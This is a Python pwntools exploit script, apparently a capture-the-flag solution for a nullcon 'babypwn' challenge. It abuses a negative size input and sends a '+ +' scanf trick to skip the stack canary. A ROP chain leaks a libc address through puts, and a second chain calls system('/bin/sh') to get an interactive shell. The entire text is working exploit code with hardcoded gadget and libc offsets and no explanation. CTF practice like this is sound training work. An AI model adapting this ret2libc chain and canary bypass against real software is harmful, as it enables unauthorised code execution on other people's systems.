from pwn import *
import ctypes

r = remote("pwn.ctf.nullcon.net", 4001)
# r = process("./babypwn")

r.sendlineafter("box?\r\n", "y")
payload = [
	0x0000000000400a43 & 2**32-1,	# pop rdi
	0x0000000000400a43 >> 32,		# pop rdi
	0x0000000000600FD0 & 2**32-1,	# __libc_start_main got
	0x0000000000600FD0 >> 32,		# __libc_start_main got
	0x00000000004006B8 & 2**32-1,	# puts plt
	0x00000000004006B8 >> 32,		# puts plt
	0x0000000000400710 & 2**32-1,	# _start
	0x0000000000400710 >> 32		# _start
]
r.sendlineafter("name: ", "5unKn0wn")
r.sendlineafter("have?\r\n", "-128")
r.sendline("0 " * 22)
r.sendline("+ +")	# bypass canary
r.sendline("0 0")
r.sendline(' '.join(`ctypes.c_int(i).value` for i in payload))
r.sendline("0 " * (128 - 26 - len(payload)))

r.recvuntil("created!\r\n")
libc = u64(r.recv(6) + "\x00\x00") - 0x20740
log.info("libc : " + hex(libc))

r.sendlineafter("box?\r\n", "y")
payload = [
	0x0000000000400a43 & 2**32-1,	# pop rdi
	0x0000000000400a43 >> 32,		# pop rdi
	(libc + 0x18cd57) & 2**32-1,	# &"/bin/sh"
	(libc + 0x18cd57) >> 32,		# &"/bin/sh"
	(libc + 0x45390) & 2**32-1,		# system
	(libc + 0x45390) >> 32,			# system
]
r.sendlineafter("name: ", "5unKn0wn")
r.sendlineafter("have?\r\n", "-128")
r.sendline("0 " * 22)
r.sendline("+ +")	# bypass canary
r.sendline("0 0")
print ' '.join(`ctypes.c_int(i).value` for i in payload)
r.sendline(' '.join(`ctypes.c_int(i).value` for i in payload))
r.sendline("0 " * (128 - 26 - len(payload)))

r.interactive()